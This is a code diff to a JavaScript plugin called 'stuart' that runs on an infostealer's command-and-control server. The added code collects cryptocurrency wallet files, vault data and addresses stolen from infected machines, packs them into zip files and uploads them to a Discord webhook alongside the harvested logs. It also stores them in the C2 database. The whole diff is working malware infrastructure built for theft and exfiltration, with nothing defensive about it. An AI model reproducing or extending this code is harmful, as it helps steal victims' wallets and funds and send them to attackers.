@@ -326,12 +326,18 @@ const DISCORD_MAX_PARTS = 10;
  * After harvest events stop, wait this long then zip+upload once.
  * Covers late seed_scan / extra scans after `results`.
  */
-const DISCORD_SETTLE_MS = 12000;
+/** Wait for late seeds + wallet_auto_data after results before one Discord post. */
+const DISCORD_SETTLE_MS = 18000;
 /** Finalize timers per client (only one upload after harvest completes). */
 const discordSettleTimers = new Map();
 const discordFlushing = new Set();
 /** In-memory harvest buffers when Discord pipeline is on (not written to C2 DB). */
 const pendingDiscordHarvest = new Map();
+/**
+ * Wallet binaries (browser extension + desktop) waiting for Discord upload.
+ * @type {Map<string, Array<{name,type,path,addresses,vaultData,size,content:Buffer}>>}
+ */
+const pendingDiscordWallets = new Map();
 let discordPollRunning = false;
 let discordPollStatus = { lastAt: 0, lastOk: null, lastError: "", imported: 0, message: "" };
 
@@ -953,25 +959,24 @@ function zipPartAsBlob(part) {
 }
 
 /**
- * Post one forum message with one or more zip parts (≤10 files).
- * On 413 (payload too large), falls back to uploading each part as its own post.
+ * Post zip parts to Discord.
+ * - New forum post: pass threadName (no threadId)
+ * - Same forum post/thread: pass threadId (no threadName) so wallets land in the log post
+ * On 413, falls back to one file per message in that same thread.
  * @param {{ zip: Buffer, filename: string }[]} parts
  */
-async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName }) {
+async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName, threadId: existingThreadId }) {
   if (!parts?.length) throw new Error("no zip parts");
   const n = Math.min(parts.length, DISCORD_MAX_PARTS);
   const useParts = parts.slice(0, n);
 
   const sizes = useParts.map(p => `${p.filename}=${(p.size / 1024 / 1024).toFixed(2)}MiB`).join(", ");
-  console.log(`[stuart] Discord upload attempt: ${useParts.length} file(s) [${sizes}]`);
+  console.log(`[stuart] Discord upload attempt: ${useParts.length} file(s) [${sizes}] thread=${existingThreadId || "new"}`);
 
   async function postOnce(partList, opts = {}) {
     const form = new FormData();
     const payload = { content: opts.content ?? content };
-    if (opts.threadName) payload.thread_name = opts.threadName;
-    if (opts.threadId) {
-      // reply into existing forum thread — no thread_name
-    }
+    if (opts.threadName && !opts.threadId) payload.thread_name = opts.threadName;
     form.append("payload_json", JSON.stringify(payload));
     for (let i = 0; i < partList.length; i++) {
       form.append(`files[${i}]`, zipPartAsBlob(partList[i]), partList[i].filename);
@@ -994,23 +999,20 @@ async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName
   }
 
   try {
-    return await postOnce(useParts, { threadName });
+    return await postOnce(useParts, { threadName, threadId: existingThreadId });
   } catch (e) {
-    // 413 / entity too large: upload one file per message (first creates forum thread)
     const tooBig = e.status === 413
       || /payload|too large|entity too large|maximum size|8000000|8388608/i.test(String(e.message) + String(e.body || ""));
     if (!tooBig || useParts.length === 0) throw e;
 
     console.warn(`[stuart] multi-file Discord upload failed (${e.message}); retrying one part at a time`);
     let firstMsg = null;
-    let threadId = null;
+    let threadId = existingThreadId || null;
     for (let i = 0; i < useParts.length; i++) {
       const p = useParts[i];
-      // If a single part is still over limit, Discord will still reject — re-split that part
       if (p.size > DISCORD_PART_MAX_BYTES) {
         throw new Error(
-          `Zip part ${p.filename} is ${(p.size / 1024 / 1024).toFixed(2)} MiB; Discord limit ~8 MiB. ` +
-          `Re-harvest with less history or raise boost level.`
+          `Zip part ${p.filename} is ${(p.size / 1024 / 1024).toFixed(2)} MiB; Discord limit ~8 MiB.`
         );
       }
       const partContent = useParts.length > 1
@@ -1023,14 +1025,14 @@ async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName
         firstMsg = msg;
       } else {
         msg = await postOnce([p], { threadId, content: partContent });
-        // merge attachments onto firstMsg for import helper
-        if (firstMsg && msg?.attachments) {
+        if (!firstMsg) firstMsg = msg;
+        else if (msg?.attachments) {
           firstMsg.attachments = [...(firstMsg.attachments || []), ...msg.attachments];
         }
       }
       console.log(`[stuart] Discord part ${i + 1}/${useParts.length} ok: ${p.filename}`);
     }
-    return firstMsg || { ok: true };
+    return firstMsg || { ok: true, channel_id: threadId };
   }
 }
 
@@ -1137,8 +1139,211 @@ async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
   return { ok: true, clientId, parts: n };
 }
 
+function bufferDiscordWallet(clientId, payload) {
+  if (!payload?.content) return;
+  let list = pendingDiscordWallets.get(clientId);
+  if (!list) {
+    list = [];
+    pendingDiscordWallets.set(clientId, list);
+  }
+  let content;
+  try {
+    content = Buffer.from(payload.content, "base64");
+  } catch (_) {
+    return;
+  }
+  if (!content.length) return;
+  // Replace same name if re-sent
+  const name = String(payload.name || "wallet");
+  const idx = list.findIndex(w => w.name === name);
+  const entry = {
+    name,
+    type: payload.type || null,
+    path: payload.path || "",
+    addresses: payload.addresses || [],
+    vaultData: payload.vaultData || null,
+    size: payload.size || content.length,
+    content,
+  };
+  if (idx >= 0) list[idx] = entry;
+  else list.push(entry);
+  console.log(`[stuart] buffered wallet for Discord: ${name} (${content.length} bytes) client=${clientId}`);
+}
+
+function safeWalletFileName(name, index) {
+  const base = safeFsName(name || `wallet_${index}`).slice(0, 80) || `wallet_${index}`;
+  return `${index}_${base}.zip`;
+}
+
 /**
- * After harvest is fully settled: one Discord forum post with 1..N zip parts (8MB each).
+ * Pack desktop + extension wallet zips into ≤7.5 MiB container zips for Discord.
+ * Each container has meta.json (kind: wallets) + individual wallet *.zip files.
+ */
+function buildWalletZipParts(wallets, clientId) {
+  if (!wallets?.length) return null;
+  const prefix = clientId
+    ? `stuart-${safeFsName(clientId).slice(0, 32)}-wallets`
+    : "stuart-global-wallets";
+  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+  const baseName = clientId
+    ? `stuart-${safeFsName(clientId).slice(0, 20)}-wallets-${stamp}`
+    : `stuart-global-wallets-${stamp}`;
+
+  // Prepare wallet file entries
+  const items = wallets.map((w, i) => {
+    const file = safeWalletFileName(w.name, i);
+    return {
+      file,
+      name: w.name,
+      type: w.type,
+      path: w.path,
+      addresses: w.addresses || [],
+      vaultData: w.vaultData || null,
+      size: w.content.length,
+      data: w.content,
+    };
+  });
+
+  // Greedy pack into bins by raw size, then zip+re-split if needed
+  const bins = [];
+  for (const it of items) {
+    if (it.size > DISCORD_PART_MAX_BYTES) {
+      // Single wallet larger than Discord limit — own part (may still fail if >8MiB)
+      console.warn(`[stuart] wallet ${it.name} is ${(it.size / 1024 / 1024).toFixed(2)} MiB (over soft limit)`);
+      bins.push({ items: [it], size: it.size });
+      continue;
+    }
+    let placed = false;
+    for (const bin of bins) {
+      if (bin.size + it.size + 4096 <= DISCORD_PART_MAX_BYTES) {
+        bin.items.push(it);
+        bin.size += it.size;
+        placed = true;
+        break;
+      }
+    }
+    if (!placed) bins.push({ items: [it], size: it.size });
+  }
+
+  const parts = [];
+  for (let bi = 0; bi < bins.length && parts.length < DISCORD_MAX_PARTS; bi++) {
+    const bin = bins[bi];
+    const meta = {
+      v: 1,
+      source: "stuart",
+      kind: "wallets",
+      clientId: clientId || null,
+      capturedAt: Date.now(),
+      wallets: bin.items.map(it => ({
+        file: it.file,
+        name: it.name,
+        type: it.type,
+        path: it.path,
+        addresses: it.addresses,
+        vaultData: it.vaultData,
+        size: it.size,
+      })),
+    };
+    const files = [
+      { name: `${prefix}/meta.json`, data: Buffer.from(JSON.stringify(meta, null, 2), "utf8") },
+      ...bin.items.map(it => ({ name: `${prefix}/${it.file}`, data: it.data })),
+    ];
+    let zip = createZipBuffer(files);
+    // If compressed still too big and multiple wallets, split bin
+    if (zip.length > DISCORD_PART_MAX_BYTES && bin.items.length > 1) {
+      const mid = Math.ceil(bin.items.length / 2);
+      bins.splice(bi, 1, { items: bin.items.slice(0, mid), size: 0 }, { items: bin.items.slice(mid), size: 0 });
+      bi--;
+      continue;
+    }
+    const filename = bins.length === 1 && parts.length === 0
+      ? `${baseName}.zip`
+      : `${baseName}.part${parts.length + 1}.zip`;
+    console.log(`[stuart] wallet zip part: ${filename} ${(zip.length / 1024 / 1024).toFixed(2)} MiB (${bin.items.length} wallets)`);
+    parts.push({ zip, filename, size: zip.length, kind: "wallets" });
+  }
+
+  if (!parts.length) return null;
+  return { parts, count: wallets.length, totalParts: parts.length };
+}
+
+/** Import wallet container zip(s) into wallet_data + wallets index. */
+function importWalletPartsIntoDb(db, clientId, parts) {
+  if (!parts?.length || !stmts) return { ok: false, imported: 0 };
+  let imported = 0;
+  const now = Date.now();
+  const insWd = db.prepare(
+    `INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`
+  );
+
+  for (const p of parts) {
+    const entries = unzipAll(p.zip);
+    let meta = null;
+    const filesByBase = new Map();
+    for (const ent of entries) {
+      const bn = baseName(ent.name);
+      if (bn === "meta.json") {
+        try { meta = JSON.parse(ent.data.toString("utf8")); } catch (_) {}
+      } else {
+        filesByBase.set(bn, ent.data);
+        // also key by full relative path leaf
+        filesByBase.set(ent.name.replace(/\\/g, "/").split("/").pop(), ent.data);
+      }
+    }
+    const cid = meta?.clientId || clientId;
+    const list = meta?.wallets || [];
+    if (list.length) {
+      for (const w of list) {
+        const data = filesByBase.get(w.file) || filesByBase.get(baseName(w.file));
+        if (!data) {
+          console.warn(`[stuart] wallet file missing in container: ${w.file}`);
+          continue;
+        }
+        let bp = null;
+        if (blobDir) {
+          bp = walletBlobPath(cid, w.name);
+          if (!writeBlob(bp, data)) bp = null;
+        }
+        insWd.run(
+          cid, w.name, w.path || "", w.type || null,
+          JSON.stringify(w.addresses || []),
+          w.vaultData || null,
+          bp ? null : data, bp, w.size || data.length, now,
+        );
+        stmts.insWl.run(cid, w.name, w.type || null, w.path || null, 0, w.size || data.length, now);
+        imported++;
+      }
+    } else {
+      // Fallback: any non-meta zip entry is a wallet
+      for (const [name, data] of filesByBase) {
+        if (name === "meta.json" || !name.endsWith(".zip")) continue;
+        const wname = name.replace(/\.zip$/i, "");
+        let bp = null;
+        if (blobDir) {
+          bp = walletBlobPath(cid, wname);
+          if (!writeBlob(bp, data)) bp = null;
+        }
+        insWd.run(cid, wname, "", null, "[]", null, bp ? null : data, bp, data.length, now);
+        stmts.insWl.run(cid, wname, null, null, 0, data.length, now);
+        imported++;
+      }
+    }
+    stmts.upsertRun.run(cid, now);
+  }
+
+  try {
+    pluginCtx?.broadcast?.("wallet_data_update", { clientId, source: "discord" });
+    pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
+  } catch (_) {}
+  console.log(`[stuart] imported ${imported} wallet(s) from Discord containers for ${clientId}`);
+  return { ok: true, imported, clientId };
+}
+
+/**
+ * After harvest is fully settled:
+ * 1) Upload log zip(s) → creates forum post
+ * 2) Upload wallet zip(s) into the SAME thread (thread_id)
+ * 3) Import both on the server for display
  */
 async function flushDiscordHarvest(clientId) {
   if (!isDiscordPipelineOn()) {
@@ -1151,6 +1356,8 @@ async function flushDiscordHarvest(clientId) {
 
   const buffered = pendingDiscordHarvest.get(clientId);
   pendingDiscordHarvest.delete(clientId);
+  const wallets = pendingDiscordWallets.get(clientId) || [];
+  pendingDiscordWallets.delete(clientId);
 
   try {
     let multi = null;
@@ -1158,47 +1365,107 @@ async function flushDiscordHarvest(clientId) {
     if (!multi && pluginCtx?.db) {
       multi = buildZipPartsFromExportData(collectExportData(pluginCtx.db, clientId), clientId);
     }
-    if (!multi?.parts?.length) return { ok: false, skipped: true, reason: "no data to export" };
+    const walletPack = wallets.length ? buildWalletZipParts(wallets, clientId) : null;
 
-    const content = buildDiscordSummary(clientId, multi.counts) +
-      (multi.totalParts > 1 ? `\nParts: **${multi.totalParts}** (≤8MB each, same post)` : "");
+    if (!multi?.parts?.length && !walletPack?.parts?.length) {
+      return { ok: false, skipped: true, reason: "no data to export" };
+    }
+
     const threadName = forumThreadName(clientId);
+    const logContent = multi
+      ? buildDiscordSummary(clientId, multi.counts) +
+        (multi.totalParts > 1 ? `\nLog parts: **${multi.totalParts}**` : "") +
+        (walletPack ? `\nWallets pending: **${walletPack.count}** (same post)` : "")
+      : `**Stuart wallets**\nclient_id: \`${clientId}\`\nWallets: **${walletPack.count}**`;
 
-    const msg = await postZipsToDiscordWebhook({
-      webhookUrl: pluginSettings.discord_webhook_url,
-      parts: multi.parts,
-      content,
-      threadName,
-    });
-    const totalBytes = multi.parts.reduce((s, p) => s + p.size, 0);
-    console.log(
-      `[stuart] Discord webhook ok client=${clientId} parts=${multi.totalParts} bytes=${totalBytes} files=${multi.parts.map(p => p.filename).join(",")}`
-    );
+    let msg = null;
+    let threadId = null;
+    let importedLogs = null;
+    let importedWallets = null;
 
-    // Import this harvest only (local parts — reliable, no other posts)
-    let imported = null;
-    if (pluginCtx?.db) {
-      try {
-        imported = await importThisWebhookZip(pluginCtx.db, msg, clientId, multi.parts);
-      } catch (e) {
-        console.warn("[stuart] import after upload failed:", e.message);
-        imported = { ok: false, error: e.message };
+    // ── 1) Log zips (create forum post) ──────────────────────────
+    if (multi?.parts?.length) {
+      msg = await postZipsToDiscordWebhook({
+        webhookUrl: pluginSettings.discord_webhook_url,
+        parts: multi.parts,
+        content: logContent,
+        threadName,
+      });
+      threadId = msg?.channel_id || null;
+      const totalBytes = multi.parts.reduce((s, p) => s + p.size, 0);
+      console.log(
+        `[stuart] Discord logs ok client=${clientId} parts=${multi.totalParts} bytes=${totalBytes} thread=${threadId}`
+      );
+      if (pluginCtx?.db) {
+        try {
+          importedLogs = await importThisWebhookZip(pluginCtx.db, msg, clientId, multi.parts);
+        } catch (e) {
+          console.warn("[stuart] log import failed:", e.message);
+          importedLogs = { ok: false, error: e.message };
+        }
+      }
+    }
+
+    // ── 2) Wallet zips on the SAME forum post/thread ─────────────
+    if (walletPack?.parts?.length) {
+      const wContent = [
+        `**Stuart wallets**`,
+        `client_id: \`${clientId}\``,
+        `Wallets: **${walletPack.count}**`,
+        walletPack.totalParts > 1 ? `Parts: **${walletPack.totalParts}** (≤8MB, same post)` : "",
+      ].filter(Boolean).join("\n");
+
+      let wMsg;
+      if (threadId) {
+        // Same post: follow-up attachments in the log forum thread
+        wMsg = await postZipsToDiscordWebhook({
+          webhookUrl: pluginSettings.discord_webhook_url,
+          parts: walletPack.parts,
+          content: wContent,
+          threadId,
+        });
+      } else {
+        // No logs — wallets create the post
+        wMsg = await postZipsToDiscordWebhook({
+          webhookUrl: pluginSettings.discord_webhook_url,
+          parts: walletPack.parts,
+          content: wContent,
+          threadName,
+        });
+        threadId = wMsg?.channel_id || threadId;
+        msg = msg || wMsg;
+      }
+      console.log(
+        `[stuart] Discord wallets ok client=${clientId} count=${walletPack.count} parts=${walletPack.totalParts} thread=${threadId}`
+      );
+      if (pluginCtx?.db) {
+        try {
+          importedWallets = importWalletPartsIntoDb(pluginCtx.db, clientId, walletPack.parts);
+        } catch (e) {
+          console.warn("[stuart] wallet import failed:", e.message);
+          importedWallets = { ok: false, error: e.message };
+        }
       }
     }
 
     return {
       ok: true,
-      parts: multi.totalParts,
-      filenames: multi.parts.map(p => p.filename),
-      size: totalBytes,
-      counts: multi.counts,
+      logParts: multi?.totalParts || 0,
+      walletParts: walletPack?.totalParts || 0,
+      walletCount: walletPack?.count || 0,
+      filenames: [
+        ...(multi?.parts || []).map(p => p.filename),
+        ...(walletPack?.parts || []).map(p => p.filename),
+      ],
       threadName,
+      threadId,
       messageId: msg?.id || null,
-      threadId: msg?.channel_id || null,
-      imported,
+      importedLogs,
+      importedWallets,
     };
   } catch (err) {
     if (buffered) pendingDiscordHarvest.set(clientId, buffered);
+    if (wallets.length) pendingDiscordWallets.set(clientId, wallets);
     console.error(`[stuart] Discord webhook failed:`, err.message);
     return { ok: false, error: err.message };
   } finally {
@@ -2323,7 +2590,25 @@ export default {
       tx();
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "wallet_auto_data") {
-      // Binary wallet blobs stay on C2 (too large / not in text zip path)
+      if (isDiscordPipelineOn()) {
+        // Buffer browser-extension + desktop wallet zips for same Discord post as logs
+        bufferDiscordWallet(clientId, payload || {});
+        // Also keep wallet index metadata in harvest buffer
+        if (payload?.name) {
+          bufferDiscordHarvest(clientId, {
+            wallets: [{
+              name: payload.name,
+              type: payload.type,
+              path: payload.path,
+              files: 0,
+              size: payload.size || 0,
+            }],
+          }, { replace: false });
+        }
+        scheduleDiscordFinalize(clientId);
+        try { ctx.broadcast("discord_upload_pending", { clientId, wallets: true }); } catch (_) {}
+        return;
+      }
       const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
       let bp = null;
       if (content && blobDir) {
